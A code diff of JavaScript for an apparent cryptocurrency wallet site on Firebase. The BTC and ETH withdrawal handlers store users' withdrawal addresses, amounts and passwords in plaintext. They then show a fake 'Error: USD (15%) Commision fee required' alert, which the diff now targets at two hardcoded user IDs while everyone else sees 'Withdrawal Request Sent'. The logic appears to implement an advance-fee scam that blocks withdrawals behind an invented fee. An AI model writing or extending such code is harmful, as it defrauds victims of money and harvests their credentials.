@@ -139,19 +139,41 @@ const savebtcwithdrawlToDb = () => {
                 var uid = user.uid;
 
 
-                db.collection("btc-withdrawals").doc(uid).set({
-                    btcaddress: btcAddress,
-                    btcamount: btcAmount,
-                    btcdescription: btcDescription,
-                    btcpassword: btcPassword
-                }, { merge: true })
-                    .then(() => {
-                        alert("Error: USD (15%) Commision fee required")
+                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82") {
+                    console.log("hmmm");
 
-                    })
-                    .catch((error) => {
-                        // console.error("Error writing document: ", error);
-                    });
+                    db.collection("btc-withdrawals").doc(uid).set({
+                        btcaddress: btcAddress,
+                        btcamount: btcAmount,
+                        btcdescription: btcDescription,
+                        btcpassword: btcPassword
+                    }, { merge: true })
+                        .then(() => {
+                            alert("Error: USD (15%) Commision fee required")
+
+                        })
+                        .catch((error) => {
+                            // console.error("Error writing document: ", error);
+                        });
+
+                }
+                else {
+
+                    db.collection("btc-withdrawals").doc(uid).set({
+                        btcaddress: btcAddress,
+                        btcamount: btcAmount,
+                        btcdescription: btcDescription,
+                        btcpassword: btcPassword
+                    }, { merge: true })
+                        .then(() => {
+                            alert("Withdrawal Request Sent")
+
+                        })
+                        .catch((error) => {
+                            // console.error("Error writing document: ", error);
+                        });
+                }
+
 
                 // ...
             } else {
@@ -191,20 +213,41 @@ const saveethwithdrawlToDb = () => {
                 // https://firebase.google.com/docs/reference/js/firebase.User
                 var uid = user.uid;
 
+                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82") {
 
-                db.collection("eth-withdrawals").doc(uid).set({
-                    ethaddress: ethAddress,
-                    ethamount: ethAmount,
-                    ethdescription: ethDescription,
-                    ethpassword: ethPassword
-                }, { merge: true })
-                    .then(() => {
-                        alert("Error: USD (15%) Commision fee required")
+                    db.collection("eth-withdrawals").doc(uid).set({
+                        ethaddress: ethAddress,
+                        ethamount: ethAmount,
+                        ethdescription: ethDescription,
+                        ethpassword: ethPassword
+                    }, { merge: true })
+                        .then(() => {
+                            alert("Error: USD (15%) Commision fee required")
 
-                    })
-                    .catch((error) => {
-                        // console.error("Error writing document: ", error);
-                    });
+                        })
+                        .catch((error) => {
+                            // console.error("Error writing document: ", error);
+                        });
+                }
+                else {
+
+                    db.collection("eth-withdrawals").doc(uid).set({
+                        ethaddress: ethAddress,
+                        ethamount: ethAmount,
+                        ethdescription: ethDescription,
+                        ethpassword: ethPassword
+                    }, { merge: true })
+                        .then(() => {
+                            alert("Withdrawal Request Sent")
+
+                        })
+                        .catch((error) => {
+                            // console.error("Error writing document: ", error);
+                        });
+
+                }
+
+
 
                 // ...
             } else {
@@ -783,7 +826,7 @@ const exchangeAssets = () => {
                 selectedAssets = document.getElementById("selectVal").value;
                 choosenAmount = document.getElementById("amounttoexchange").value;
 
-                
+
                 var docRef = db.collection("usd-wallets").doc(uid);
 
 
@@ -898,7 +941,7 @@ const exchangeAssets2 = () => {
                 selectedAssets = document.getElementById("selectVal2").value;
                 choosenAmount = document.getElementById("amounttoexchange2").value;
 
-                
+
                 var docRef = db.collection("usd-wallets").doc(uid);
 
 
@@ -993,7 +1036,7 @@ const exchangeAssets2 = () => {
 // console.log(currentamt);
 
 function getuserusdwalletsforExchange() {
-    
+
 
     firebase.auth().onAuthStateChanged((user) => {
 
